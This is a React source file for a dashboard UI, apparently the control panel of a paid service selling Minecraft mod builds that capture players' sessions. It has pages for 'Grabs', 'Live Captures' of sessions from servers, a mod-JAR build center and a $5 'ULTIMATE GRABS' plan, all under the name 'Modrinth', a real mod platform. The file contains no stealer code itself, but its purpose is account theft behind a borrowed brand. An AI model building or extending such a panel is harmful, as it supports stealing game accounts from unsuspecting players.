'use client';

import { useState } from 'react';

const colors = {
  bg: '#0a0a0f',
  panel: '#111218',
  border: '#1e1f28',
  text: '#ffffff',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '9px 14px', borderRadius: 8,
      background: active ? '#1a1b24' : 'transparent',
      color: active ? colors.text : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}>
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

function Dashboard() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: 0 }}>Good evening, bnn.</h1>
      <p style={{ color: colors.textDim, fontSize: 14, marginTop: 4, marginBottom: 24 }}>Your workspace is ready.</p>
      <div style={{ display: 'flex', gap: 14, marginBottom: 24 }}>
        {[
          { icon: '👤', label: 'USERS', value: '0', sub: 'No users yet' },
          { icon: '💬', label: 'CONNECTIONS', value: '0', sub: 'Connected with nobody' },
          { icon: '🌐', label: 'HITS', value: '0', sub: '0 total entries' },
        ].map((c, i) => (
          <div key={i} style={{ background: colors.panel, borderRadius: 10, padding: '18px 20px', flex: 1, border: `1px solid ${colors.border}` }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 6, color: colors.textDim, fontSize: 12, marginBottom: 10 }}>
              <span style={{ fontSize: 14 }}>{c.icon}</span> {c.label}
            </div>
            <div style={{ fontSize: 28, fontWeight: 700, color: colors.text }}>{c.value}</div>
            <div style={{ fontSize: 12, color: colors.textDim, marginTop: 4 }}>{c.sub}</div>
          </div>
        ))}
      </div>
      <div style={{ display: 'flex', gap: 14 }}>
        <div style={{ flex: 1 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
            <span style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase' }}>Recent Captures</span>
          </div>
          <div style={{ height: 160, background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
            <span style={{ fontSize: 28, marginBottom: 8 }}>🔒</span>
            <span style={{ fontSize: 13 }}>No captures yet</span>
          </div>
        </div>
        <div style={{ width: 240 }}>
          <div style={{ fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>Top Servers</div>
          <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: 20, color: colors.textDim, fontSize: 13 }}>No servers yet</div>
        </div>
      </div>
    </div>
  );
}

function Grabs() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Grabs</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>All captured sessions will appear here.</p>
      <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, height: 400, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
        <span style={{ fontSize: 28, marginBottom: 8 }}>📭</span>
        <span style={{ fontSize: 13 }}>No grabs yet</span>
      </div>
    </div>
  );
}

function Build() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Build Center</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Build, download, and install your mods.</p>
      <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 24, marginBottom: 20 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
          <span>🔨</span> Build Mod
        </div>
        <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>VERSION</div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16 }}>
          <div style={{ background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 16px', fontSize: 14, color: colors.text, display: 'flex', alignItems: 'center', gap: 8 }}>
            Fabric 1.21.11
            <span style={{ background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '2px 6px', borderRadius: 4 }}>LATEST</span>
          </div>
        </div>
        <button style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.text, padding: '10px 20px', borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 8 }}>
          <span>🔨</span> Rebuild JAR
        </button>
      </div>
      <div>
        <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 12 }}>YOUR MODS</div>
        <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, padding: '14px 18px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <span style={{ fontSize: 20 }}>📄</span>
            <div>
              <div style={{ fontSize: 14, fontWeight: 500, color: colors.text }}>fabric-1.21.11.jar</div>
              <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2 }}>May 25, 2026 · 16.0 MB</div>
            </div>
          </div>
          <button style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: colors.text, padding: '8px 16px', borderRadius: 8, fontSize: 13, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6 }}>
            <span>↓</span> Download
          </button>
        </div>
      </div>
    </div>
  );
}

function Plans() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Plans</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Upgrade to unlock more features.</p>
      <div style={{ maxWidth: 400 }}>
        <div style={{ background: colors.panel, border: `1px solid ${colors.green}`, borderRadius: 12, padding: 28, position: 'relative' }}>
          <div style={{ position: 'absolute', top: -10, left: 20, background: colors.green, color: '#000', fontSize: 10, fontWeight: 700, padding: '3px 10px', borderRadius: 8 }}>PRO</div>
          <div style={{ fontSize: 12, color: colors.green, letterSpacing: 1, marginBottom: 6, fontWeight: 600 }}>👑 ULTIMATE GRABS</div>
          <div style={{ fontSize: 36, fontWeight: 700, color: colors.text }}>$5</div>
          <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 20 }}>/ month</div>
          {['Unlimited sessions', 'Permanent data retention', 'Webhook notifications', 'Auth Mods & Builds', 'Priority support'].map((f, i) => (
            <div key={i} style={{ fontSize: 13, color: colors.text, marginBottom: 8, display: 'flex', gap: 8 }}>
              <span style={{ color: colors.green }}>✓</span> {f}
            </div>
          ))}
          <button disabled style={{ width: '100%', marginTop: 16, padding: '10px 0', background: colors.green, color: '#000', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 600, opacity: 0.5, cursor: 'not-allowed' }}>Coming Soon</button>
        </div>
      </div>
    </div>
  );
}

function RepPage({ username }) {
  const [reviews, setReviews] = useState([]);
  const [newRep, setNewRep] = useState('');
  const [editingId, setEditingId] = useState(null);
  const [editText, setEditText] = useState('');
  const [menuOpen, setMenuOpen] = useState(null);
  const [filter, setFilter] = useState('Newest');

  const handlePost = () => {
    if (!newRep.trim() || !username) return;
    setReviews([{ id: Date.now(), user: username, tag: 'Good', time: 'Just now', text: newRep.trim() }, ...reviews]);
    setNewRep('');
  };

  const handleDelete = (id) => {
    setReviews(reviews.filter(r => r.id !== id));
    setMenuOpen(null);
  };

  const handleEdit = (id) => {
    const r = reviews.find(r => r.id === id);
    setEditingId(id);
    setEditText(r.text);
    setMenuOpen(null);
  };

  const handleSaveEdit = (id) => {
    setReviews(reviews.map(r => r.id === id ? { ...r, text: editText, time: 'Edited just now' } : r));
    setEditingId(null);
    setEditText('');
  };

  const filtered = filter === 'Good' ? reviews.filter(r => r.tag === 'Good') :
    filter === 'Bad' ? reviews.filter(r => r.tag === 'Bad') :
    filter === 'Mine' ? reviews.filter(r => r.user === username) :
    filter === 'Oldest' ? [...reviews].reverse() :
    reviews;

  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <div style={{ marginBottom: 20 }}>
        <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 4px 0' }}>+Rep</h1>
        <p style={{ color: colors.textDim, fontSize: 14, margin: 0 }}>{reviews.length} reviews from users.</p>
      </div>

      {username ? (
        <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20 }}>
          <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 8 }}>Add your rep</div>
          <div style={{ display: 'flex', gap: 8 }}>
            <input
              value={newRep}
              onChange={e => setNewRep(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && handlePost()}
              placeholder="Write a review..."
              style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }}
            />
            <button onClick={handlePost} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 18px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Confirm</button>
          </div>
        </div>
      ) : (
        <div style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: 16, marginBottom: 20, textAlign: 'center', color: colors.textDim, fontSize: 13 }}>
          Sign in to leave a review
        </div>
      )}

      <div style={{ display: 'flex', gap: 8, marginBottom: 20 }}>
        {['Newest', 'Oldest', 'Good', 'Bad', 'Mine'].map((f) => (
          <button key={f} onClick={() => setFilter(f)} style={{ background: filter === f ? colors.text : 'transparent', color: filter === f ? colors.bg : colors.textDim, border: 'none', padding: '6px 14px', borderRadius: 6, fontSize: 13, cursor: 'pointer', fontWeight: 500 }}>{f}</button>
        ))}
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
        {filtered.map((r) => (
          <div key={r.id} style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 10, padding: '16px 20px', position: 'relative' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 6 }}>
              <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{r.user}</span>
              <span style={{ background: '#1a2a1a', color: colors.green, fontSize: 11, padding: '2px 8px', borderRadius: 4, fontWeight: 600 }}>👍 {r.tag}</span>
              <span style={{ fontSize: 12, color: colors.textDim, marginLeft: 'auto' }}>{r.time}</span>
              {r.user === username && (
                <div style={{ position: 'relative' }}>
                  <span onClick={() => setMenuOpen(menuOpen === r.id ? null : r.id)} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 16, padding: '0 4px' }}>⋯</span>
                  {menuOpen === r.id && (
                    <div style={{ position: 'absolute', top: '100%', right: 0, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: 6, zIndex: 10, minWidth: 100 }}>
                      <div onClick={() => handleEdit(r.id)} style={{ padding: '8px 12px', fontSize: 13, color: colors.text, cursor: 'pointer', borderRadius: 4 }}>Edit</div>
                      <div onClick={() => handleDelete(r.id)} style={{ padding: '8px 12px', fontSize: 13, color: '#ef4444', cursor: 'pointer', borderRadius: 4 }}>Delete</div>
                    </div>
                  )}
                </div>
              )}
            </div>
            {editingId === r.id ? (
              <div style={{ display: 'flex', gap: 8 }}>
                <input value={editText} onChange={e => setEditText(e.target.value)} onKeyDown={e => e.key === 'Enter' && handleSaveEdit(r.id)} style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 6, padding: '8px 12px', color: colors.text, fontSize: 14, outline: 'none' }} />
                <button onClick={() => handleSaveEdit(r.id)} style={{ background: colors.green, color: '#000', border: 'none', borderRadius: 6, padding: '8px 14px', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>Save</button>
              </div>
            ) : (
              <p style={{ fontSize: 14, color: colors.text, margin: 0 }}>{r.text}</p>
            )}
          </div>
        ))}
        {filtered.length === 0 && (
          <div style={{ textAlign: 'center', color: colors.textDim, fontSize: 13, padding: 40 }}>No reviews yet</div>
        )}
      </div>
    </div>
  );
}

function LiveCaptures() {
  return (
    <div style={{ flex: 1, padding: '28px 36px' }}>
      <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Live Captures</h1>
      <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Real-time session captures from your servers.</p>
      <div style={{ background: colors.panel, borderRadius: 10, border: `1px solid ${colors.border}`, height: 400, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>
        <span style={{ fontSize: 28, marginBottom: 8 }}>📡</span>
        <span style={{ fontSize: 13 }}>No live captures</span>
      </div>
    </div>
  );
}

export default function DashboardPage() {
  const [page, setPage] = useState('dashboard');
  const username = 'You';
  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 200, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>Modrinth</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" active={page === 'dashboard'} onClick={() => setPage('dashboard')} />
          <NavItem icon="⚡" label="Grabs" active={page === 'grabs'} onClick={() => setPage('grabs')} />
          <NavItem icon="🔨" label="Build" active={page === 'build'} onClick={() => setPage('build')} />
          <NavItem icon="📋" label="Plans" active={page === 'plans'} onClick={() => setPage('plans')} />
          <NavItem icon="⭐" label="+Rep" active={page === 'rep'} onClick={() => setPage('rep')} />
          <NavItem icon="📡" label="Live Captures" active={page === 'live'} onClick={() => setPage('live')} />
        </div>
        <div>
          <NavItem icon="⚙️" label="Settings" />
          <NavItem icon="🚪" label="Log out" />
        </div>
      </aside>
      {page === 'dashboard' && <Dashboard />}
      {page === 'grabs' && <Grabs />}
      {page === 'build' && <Build />}
      {page === 'plans' && <Plans />}
      {page === 'rep' && <RepPage username={username} />}
      {page === 'live' && <LiveCaptures />}
    </div>
  );
}
